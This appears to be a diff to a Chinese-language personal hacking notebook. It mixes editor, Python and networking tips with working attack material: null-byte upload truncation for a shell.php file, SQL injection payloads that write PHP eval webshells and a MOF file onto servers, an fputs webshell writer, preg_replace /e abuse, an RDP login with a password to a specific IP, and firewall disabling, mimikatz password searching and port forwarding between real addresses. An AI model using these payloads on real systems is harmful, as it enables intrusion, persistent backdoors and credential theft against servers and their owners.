+   所以%00截断时的下面两种情况:
+&lt;span class=&quot;p&quot;&gt;   1.&lt;/span&gt;在url中加入%00,如http://xxoo/shell.php%00.jpg
+&lt;span class=&quot;p&quot;&gt;   2.&lt;/span&gt;在burpsuite中用burp自带的十六进制编辑工具将&quot;shell.php .jpg&quot;(中间有空格)中的空格由20改成00
+&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
+   在1中,url中的%00(形如%xx),web server会把它当作十六进制处理,然后将该十六进制数据hex(00)&quot;翻译&quot;成统一的ascii码值&quot;NUL(null)&quot;,实现了截断;
+&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
+   在2中,burpsuite用burp自带的十六进制编辑工具将&quot;shell.php .jpg&quot;(中间有空格)中的空格由20改成00,如果burp中有二进制编辑工具,
+   也可以将&quot;shell.php .jpg&quot;(中间有空格)中的空格由000010 0000(键盘上可控字符space对应的二进制)改成0000 0000(null对应的二进制),
+   上传到服务器后,服务器作为一台计算机也会将该处的原来的空格由于被改成截断符后&quot;翻译&quot;成null,实现了截断功能;
+&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
+   所以在用python(或其它语言)中,要想&quot;写出&quot;截断符(null),
+   也就是要写出ascii码值的NUL(null),也就是要由hex(十六进制)下的
+   00变成ascii码值,这是语言和解释器以及计算机之间的关系,正如上面的python脚本,
+   而php中:
+   --------w3c:
+   定义和用法
+   chr() 函数从指定的 ASCII 值返回字符.
+   ASCII 值可被指定为十进制值、八进制值或十六进制值.八进制值被定义为带前置 0,而十六进制值被定义为带前置 0x. 
+   --------w3c  (w3c这里的说法把ascii值看作有不同的进制表示形态的各进制值)
+   其中chr(61)为=,chr(061)为1,chr(0x61)为a,chr(128)=chr(0x80),chr(255)=chr(0xff)
+   script 1:
+   &amp;lt;?php
+   for($k=0;$k&amp;lt;=255;$k++)
+   {
+   $a=&#39;shell.php&#39;.chr($k).&quot;1.jpg&quot;;
+   echo &#39;k:&#39;.$k.&#39;   &#39;.&#39;$a:&#39;.$a.&#39;   &#39;.&#39;iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a):&#39;.iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a).&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&quot;;
+   }
+   ?&amp;gt;
+
+   其中iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a)或是iconv(&quot;UTF-8&quot;,&quot;gb2313&quot;,$a)都会在chr(128)到chr(255)之间截断,使结果为1,而不是1(some char)2,
+   其中128和255为二进制数据表示,此处NUL(nul)(chr(0x00))并不能截断iconv函数,而是chr(128)-chr(255),也即chr(0x80)-chr(0xff)截断iconv函数.
+   或者用如下代码中hex2asc函数:
+   script 2:
+   &amp;lt;?php
+    
+   function asc2hex($str) {  
+   return &#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;.substr(chunk_split(bin2hex($str), 2, &#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;),0,-2);  
+   } &lt;span class=&quot;sb&quot;&gt;
+
+    
+&lt;/span&gt;   function hex2asc($str) {  
+   $str = join(&#39;&#39;,explode(&#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;,$str));  
+   $len = strlen($str);  
+   for ($i=0;$i&amp;lt;$len;$i+=2) $data.=chr(hexdec(substr($str,$i,2)));  
+   return $data;  
+   }  &lt;span class=&quot;sb&quot;&gt;
+
+
+&lt;/span&gt;   for($k=0;$k&amp;lt;256;$k++)
+   {
+   $a=sprintf(&quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;%02x&quot;,$k);
+   echo &#39;$k:&#39;.$k.&#39; &#39;;
+   echo &#39;$a:&#39;.$a.&#39; &#39;;
+   echo &#39;hex2asc($a):&#39;.hex2asc($a);
+   $file_name=&quot;shell.php&quot;.hex2asc($a).&quot;1.jpg&quot;;
+   echo &#39;$file_name:&#39;.$file_name.&#39;  &#39;;
+   $file_name=iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;,$file_name);
+   echo &#39;iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;,$file_name):&#39;.$file_name.&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&quot;;
+   }
+   /&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
+   echo hex2asc(&#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&#39;);
+   &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/
+   ?&amp;gt;
+   相同情况下的python脚本为:
+   def hex_to_asc(ch):
+    return &#39;{:c}&#39;.format(int(float.fromhex(ch)))
+
+   for i in range(256):
+    s = &#39;%02x&#39; % i
+    print &quot;s:&quot;,s,&quot;    &quot;,
+    print &quot;hex_to_asc(s):&quot;,hex_to_asc(s)
+    # print &quot;s:%s,hex_to_asc(s):%s&quot; % (s,hex_to_asc(s))
+&lt;span class=&quot;p&quot;&gt;55.&lt;/span&gt;htmlspecialchars的作用是把:
+   &amp;amp; (和号) 成为 &amp;amp;
+   &quot; (双引号) 成为 &quot;
+   &#39; (单引号) 成为 &#39;
+   &amp;lt; (小于) 成为 &amp;lt;
+&lt;span class=&quot;gt&quot;&gt;   &amp;gt; (大于) 成为 &amp;gt;   &lt;/span&gt;
+   输出的时候不需要特殊处理 浏览器 会把这些标签还原的
+&lt;span class=&quot;p&quot;&gt;56.&lt;/span&gt;linux命令行下结束firefox进程:
+   ps -aux | grep firefox | awk &#39;{if($11==&quot;firefox&quot;) print $2}&#39;| xargs kill -9
+   pkill firefox
+&lt;span class=&quot;p&quot;&gt;57.&lt;/span&gt;菜刀替代工具:Altman
+   http://www.i0day.com/1725.html
+   https://github.com/keepwn/Altman
+&lt;span class=&quot;p&quot;&gt;58.&lt;/span&gt;Pidgin my irc client on linux http://www.linux.com/news/software/applications/295201:five-best-irc-clients-for-linux
+&lt;span class=&quot;p&quot;&gt;59.&lt;/span&gt;dig mx domain(without www)
+&lt;span class=&quot;p&quot;&gt;60.&lt;/span&gt;pwntool:https://www.91ri.org/14382.html
+&lt;span class=&quot;p&quot;&gt;61.&lt;/span&gt;vim以十六进制编辑文件:%!xxd
+       :%!xxd    ---&amp;gt;   :%!xxd -r    ---&amp;gt;    :wq
+       如果失败则用hexedit编辑
+           ctrl+X:save and exit
+   vim对比两个文件:vim -d 1.txt 2.txt
+   vim自动保存有用版本答案(相当于esc/jk实现保存功能):au InsertLeave &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; write
+&lt;span class=&quot;p&quot;&gt;62.&lt;/span&gt;sublime插件:
+    python pep8 autoformat(python代码自动对齐)ctrl+shift+r
+    JsFormat(javascript代码自动对齐)ctrl+alt+f
+&lt;span class=&quot;p&quot;&gt;63.&lt;/span&gt;linux install node.js&amp;amp;npm   http://www.iteblog.com/archives/1313
+&lt;span class=&quot;p&quot;&gt;64.&lt;/span&gt;html内嵌js:
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Script&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;JavaScript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+   var a = prompt(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;8f93&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5165&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;4f60&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;7684&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6c&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;67&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5427&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff0c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5c11&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5e74&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff01&quot;, &quot;&quot;);
+   var b = &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;63&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&quot;;
+   var c = /.+_.+_.+/gi;
+   var d = 0x0;
+   var e = a.substr(0x8, 0x5);
+   if ($.md5(e) == b.replace(/7/ig, ++d).replace(/8/ig, d &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; 0x2)) {
+    var f = a.substr(0x0 / d, 0x7);
+    if (f.substr(0x5, 0x2) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&quot; &amp;amp;&amp;amp; $.md5(f.substr(0x0 / d, d + 0x3)) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&quot;) {
+      r = a.substr(0xd);
+      if (r.charCodeAt(d) - 0x19 == r.charCodeAt(++d) - 0x19 &amp;amp;&amp;amp; r.charCodeAt(--d) - 0x19 == r.charCodeAt(--d)) {
+        var g = String.fromCharCode(0x4f);
+        g = g.toLowerCase() + g.toLowerCase();
+        if (r.substr((++d) &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; 0x3, 0x6) == g.concat(&quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;79&quot;) &amp;amp;&amp;amp; c.test(a)) {
+          d = String(0x1) + String(a.length)
+        }
+      }
+    }
+   };
+   if (a.substr(0x4, 0x1) != String.fromCharCode(d) || a.substr(0x4, 0x1) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;7a&quot;) {
+    alert(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;989d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff0c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;518d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;53bb&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;60f3&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;60f3&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;3002&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;3002&quot;)
+   } else {
+    alert(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;606d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;559c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;606d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;559c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff01&quot;)
+   }
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;65.&lt;/span&gt;安装requirements.txt中要求的环境:pip install -r requirements.txt
+&lt;span class=&quot;p&quot;&gt;66.&lt;/span&gt;python urllib&amp;amp;urllib2:
+    http://www.bkjia.com/Pythonjc/1088462.html  Python中http请求方法库汇总,python请求库汇总
+    http请求异常处理(获取异常请求的返回内容)
+        http://my.oschina.net/duhaizhang/blog/69834
+    (爬虫实现http://blog.csdn.net/pleasecallmewhy/article/details/8925978
+    http://blog.csdn.net/pleasecallmewhy/article/details/8934726)
+    beautifulsoup中文http://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html
+   0&amp;gt;easyest way
+   import urllib2
+   response = urllib2.urlopen(&#39;http://python.org/&#39;)
+   html = response.read()
+
+   1&amp;gt;without post
+   import urllib2
+   req = urllib2.Request(&#39;http://www.voidspace.org.uk&#39;)
+   response = urllib2.urlopen(req)
+   the_page = response.read()
+
+   2&amp;gt;post:(要加入 header,data,需要使用 Request 对象)
+   import urllib
+   import urllib2
+   url = &#39;http://www.someserver.com/cgi-bin/register.cgi&#39;
+   values = {&#39;name&#39; : &#39;Michael Foord&#39;,
+             &#39;location&#39; : &#39;Northampton&#39;,
+             &#39;language&#39; : &#39;Python&#39; }
+   data = urllib.urlencode(values)
+   req = urllib2.Request(url, data)
+   response = urllib2.urlopen(req)
+   the_page = response.read()
+&lt;span class=&quot;p&quot;&gt;67.&lt;/span&gt;python使用urllib2容易犯的错误:
+　　系统安装了google的chrome浏览器,需要burp截chrome的包时会在里面设置代理,而chrome设置的代理即是系统的代理,而firefox设置的代理只是firefox浏览器的代理,并不影响系统的网络访问是否要经过firefox设置的代理,
+　　如果设置了chrome的代理如127.0.0.1:8080,事后忘记关闭,则会影响到系统中所有需要联网的程序.
+  　urllib2 默认会使用环境变量 http_proxy来设置 HTTP Proxy,如果想在程序中明确控制 Proxy 而不受环境变量的影响,可以使用自己设置的代理,可以设置代理为空:
+
+  　null_proxy_handler=urllib2.ProxyHandler({})
+  　opener=urllib2.build_opener(null_proxy_handler)
+  　urllib2.install_opener(opener)
+
+  　这样就不会出现urllib2　error 101　refused的错误了,也可以将系统的127.0.0.1:8080的代理关掉.(linux中set命令可以看到http_proxy的值,http_proxy并不是vpn的ip)
+  　在sublime text中有个sublimeREPL插件,f5快捷键可编译运行python脚本,然而就算系统设置了代理127.0.0.1:8080等,f5依然可以将使用了urllib2且没有加上面３行代码的python脚本
+  　成功执行,也许是sublimeREPL中默认的运行代码设置了自己的代理为空,且不影响系统代理http_proxy的值.
+&lt;span class=&quot;p&quot;&gt;68.&lt;/span&gt;python,beautifulsoup中正则匹配中文的错误解决办法:http://www.lylinux.org/python%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87.html
+   python正则表达式:
+       http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html
+       python一般默认贪婪模式(也即尽量往长度多的结果匹配),变成非贪婪方法:&lt;span class=&quot;ge&quot;&gt;*?(*&lt;/span&gt;加上?)
+       正则表达式 – 运算符优先级
+            http://wp.huangshiyang.com/regexp&lt;span class=&quot;sb&quot;&gt;
+
+            匹配不包含...
+            http://www.jb51.net/article/52491.htm
+
+            前向界定|后向界定|前向非界定|后向非界定
+            http://blog.csdn.net/smilelance/article/details/6529950
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;69.&lt;/span&gt;python中获得执行系统命令的输出:http://blog.csdn.net/g457499940/article/details/17068277
+&lt;span class=&quot;p&quot;&gt;70.&lt;/span&gt;python代码中不能有~符号当作/root目录的习惯,open(&#39;~/something&#39;,&#39;r+&#39;)会出错,os.system(&#39;~/something&#39;)不会,为保证不出错,在代码中不用~符号,另外os.system(),open()等函数中不要有%s这种格式化字符串变量
+　　如果要用到在这些函数中传入一个变量作参数,先在os.system(),open()等函数前面格式化成普通不带%s的变量再传入这些函数,eg.a=&#39;python /root/%s&#39; % input(),os.system(a)
+&lt;span class=&quot;p&quot;&gt;71.&lt;/span&gt;ida pro中graph功能失败,could not find grapher &#39;qwingraph.exe&#39;.please check GRAPH_VISUALIZER in ida.cfg　　　　　　解决方法http://blog.csdn.net/qysh123/article/details/17590731
+&lt;span class=&quot;p&quot;&gt;72.&lt;/span&gt;sqlmap跑出有如
+   Payload: 8.8.8.8&#39; AND 3588=3588-- RMEo
+   的盲注,如果使用了--batch参数或者使用sqlmap推荐的(found sql injection in MySQL database,dismiss other type of database?Y/n),虽然这样的盲注一般是MySQL的注入点,但是其他数据库也有可能是这样的,
+   比如SQLite,这个时候如果同意忽略其他数据库类型的检测,会发现sqlmap按照MySQL的注入语法跑不出什么结果,database:none.同理,在一般sqlmap使用过程中,为了全面的检测,最好不要一直使用sqlmap推荐的默认选项.在此例中,使用--dbms=SQLite
+   参数,成功跑出目标SQLite数据库的内容.另外,实验中发现sqlmap会出现一会能跑出,一会跑不出的现象,可见,工具不是完全可靠的,要是一下没有跑出,多跑几次就出来了.
+&lt;span class=&quot;p&quot;&gt;73.&lt;/span&gt;preg_replace包含/e修饰符利用:http://www.jb51.net/article/38714.htm　其中echo &quot;${@phpinfo()}&quot;;就可以了,不必　echo &quot;{${phpinfo()}}&quot;;
+&lt;span class=&quot;p&quot;&gt;74.&lt;/span&gt;vim配置:
+          https://github.com/xinghuacai/spf13-vim
+          http://blog.csdn.net/namecyf/article/details/7787479
+          https://github.com/Valloric/YouCompleteMe
+          https://github.com/VundleVim/Vundle.vim#about
+   python操作vim
+          http://top.jobbole.com/15078/
+   vim中F5编译运行py文件:1&amp;gt;http://zhidao.baidu.com/link?url=VwJYAbWPaVimFP0uC26hdOV8EFTTcWFIi2xvexA9z-K7dcFIpD-1TnN9893937bxdEGcrlx2qR-cEsK-UVzoma
+                           把function添加在_vimrc的前边,不要放在最后:
+                           function CheckPythonSyntax()
+                               let mp = &amp;amp;makeprg
+                               let ef = &amp;amp;errorformat
+                               let exeFile = expand(&quot;%:t&quot;)
+                               setlocal makeprg=python&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;-u
+                               set efm=%C&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%.%#,%A&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;File&lt;span class=&quot;se&quot;&gt;\ \&quot;&lt;/span&gt;%f&lt;span class=&quot;se&quot;&gt;\&quot;\\&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;line&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%l%.%#,%Z%&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;%^\ &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;%&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;@=%m
+                               silent make %
+                               copen
+                               let &amp;amp;makeprg     = mp
+                               let &amp;amp;errorformat = ef
+                           endfunctio
+   
+                           然后添加:
+                           map &lt;span class=&quot;nt&quot;&gt;&amp;lt;F5&amp;gt;&lt;/span&gt; :call CheckPythonSyntax()&lt;span class=&quot;nt&quot;&gt;&amp;lt;CR&amp;gt;&lt;/span&gt;
+                         2&amp;gt;在vimrc文件中加nnoremap &lt;span class=&quot;nt&quot;&gt;&amp;lt;buffer&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;F9&amp;gt;&lt;/span&gt; :exec &#39;!python&#39; shellescape(@%, 1)&lt;span class=&quot;nt&quot;&gt;&amp;lt;cr&amp;gt;&lt;/span&gt;(1更好)
+    vim进阶:http://coolshell.cn/articles/5426.html&lt;span class=&quot;sb&quot;&gt;
+
+    my tmux配置:
+        #https://github.com/tmux/tmux     安装最新版本
+        https://github.com/gpakosz/.tmux 安装比较好的配置
+        echo $EDITOR
+        export EDITOR=vim
+        echo $EDITOR
+        http://blog.csdn.net/g1036583997/article/details/50466499    tmux提制模式
+        http://cenalulu.github.io/linux/tmux/
+
+    ubuntu安装Oh-My-Zsh:
+        https://zhuanlan.zhihu.com/p/19556676
+        http://www.jianshu.com/p/9a5c4cb0452d
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;75.&lt;/span&gt;1&amp;gt;dmz+光猫+有线路由+无线路由下的端口映射:
+   2&amp;gt;拓扑图大致为:
+          光猫(192.168.1.1)
+           ｜
+        有线路由
+           ｜        
+        无线路由(192.168.3.1)
+           ｜        
+          内网(192.168.3.x)
+   3&amp;gt;其中光猫含有路由器功能,此处有线路由相当于集线器功能
+   4&amp;gt;如果在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4(此ip可在无线路由的wan口所在ip值看到,此ip值由光猫上的dhcp随机分配)
+   5&amp;gt;wan口和lan口区别:&amp;gt;每个路由器有wan口和lan口,光猫拨号,其wan口ip为internet接口所在ip,一般为动态获取的一个值,其lan口ip为192.168.1.1(此ip可在光猫上人工设置成任意192.168.x.1形式)
+                  　&amp;gt;无线路由的wan口ip为光猫所在局域网的ip段中的ip:192.168.1.4,lan口ip为192.168.3.1(此ip可在无线路由器上人工设置成任意192.168.x.1形式)
+   6&amp;gt;不加dmz时的内网端口映射:光猫上设置nat:将外部数据转到192.168.1.4及对应端口,无线路由器上设置nat:将外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口
+   7&amp;gt;加dmz时的内网端口映射:在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4,在无线路由器上设置nat:将外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口(其中dmz相当于转发光猫上的所有端口数据到无线路由器上,外部访问光猫公网ip即相当于访问无线路由)
+&lt;span class=&quot;p&quot;&gt;76.&lt;/span&gt;内网渗透 代理&amp;amp;转发 http://www.heysec.org/archives/115
+&lt;span class=&quot;p&quot;&gt;77.&lt;/span&gt;union select 1,2,3,4,load_file(0x433a5c666c76706c617965725c6e756c6c6576742e6d6f66),6 into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;-- - (路径中用/不用&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;
+   写一句话是select 1,2,3,4,&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&lt;/span&gt;,6 into outfile &#39;c:/ksla/lsd/&#39;-- -　　　　(outfile=dumpfile,but if not,try dumpfile instead of outfile in the first sentence)
+   mysql中phpmyadmin提权:http://blog.sina.com.cn/s/blog_b8ab0ac20101sbwe.html
+   udf:http://www.cnblogs.com/qing123/p/4676808.html
+   outfile和dumpfile区别:http://www.dedecms.com/knowledge/data-base/mysql/2012/0819/7569.html
+   在phpmyadmin中
+   windows系统在phpmyadmin的web后台写文件时写成into dumpfile &#39;c:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ww&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ome&lt;span class=&quot;se&quot;&gt;\1&lt;/span&gt;.php&#39;无法写入时,改成into dumpfie &#39;c:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;www&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;some&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;1.php&#39;
+   SELECT HEX(LOAD_FILE(0x2f70687073747564792f7777772f72654475682e706870))INTO DUMPFILE　&#39;/phpstudy/www/121.txt&#39;    (/phpstudy/www/reDuh.php)  本地(linux)取hex值
+   select unhex(&#39;...&#39;) into dumpfile &#39;c:/inetpub/wwwroot/memberinfo/....php&#39;;-- -成功,这样不会被转义,如果是outfile会被转义　远程dumpfile出去 (对方windows)
+   同理写shell:bs/news.php?id=3 and 1=2 union select null,null,null,null,unhex(&#39;3C3F70687020406576616C28245F504F53545B27746F6D275D293B3F3E&#39;) into dumpfile &#39;C:/AAWServer/www/php/k82.php&#39;;
+&lt;span class=&quot;p&quot;&gt;78.&lt;/span&gt;有时候visual studio2015或其它版本的ide编译出来的exe文件无法在其它机器上运行(release版本也不可以的时候)可以直接试试g++/gcc -o out.exe file.cpp等命令自行编译.
+&lt;span class=&quot;p&quot;&gt;79.&lt;/span&gt;ctrl+shift+p==&amp;gt;install==&amp;gt;package syning,backup sublime settings==&amp;gt;https://github.com/csch0/SublimeText-Package-Syncing
+&lt;span class=&quot;p&quot;&gt;80.&lt;/span&gt;http://www.tuicool.com/articles/zIJrEjn GitHub上README写法暨markdown语法解读
+&lt;span class=&quot;p&quot;&gt;81.&lt;/span&gt;windows下cacls查看权限和设置权限http://41080138.blog.51cto.com/2587513/951403
+&lt;span class=&quot;p&quot;&gt;82.&lt;/span&gt;php写shell: cmd=fputs(fopen(&#39;chk.php&#39;,&#39;w&#39;),&#39;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php @eval($_POST[nihao]); ?&amp;gt;&lt;/span&gt;&#39;);
+   其中nihao的位置不能有&#39;&#39;或&quot;&quot;,而且fputs的第二个参数只能用单引号包住
+&lt;span class=&quot;p&quot;&gt;83.&lt;/span&gt;rdesktop -u administrator -p nihao103.240.203.6:3389
+&lt;span class=&quot;p&quot;&gt;84.&lt;/span&gt;到最外面调时间,拉到中间没到最外面调星期和日期(中间时,顺时针调星期,逆时针调  
+   日期)
+&lt;span class=&quot;p&quot;&gt;85.&lt;/span&gt;windows 2003,stop firewall service and policy command:net stop sharedaccess, net stop policyagent
+   load  mimikatz
+   mimikatz_command -f sekurlsa::searchPasswords
+    -slave 103.240.203.6 200  202.177.192.16 3389
+    local:-listen 
+&lt;span class=&quot;p&quot;&gt;86.&lt;/span&gt;sa权限上传文件九种方法:http://www.csdn123.com/html/20130308/49/019024fd66e9a1a793e4344a6cc47175.htm
+&lt;span class=&quot;p&quot;&gt;87.&lt;/span&gt;内网渗透:http://www.pojie567.com/blog/?post=5186
+             http://www.1990day.com/regeorg-proxychains-gold-partner/
+             http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
+             http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
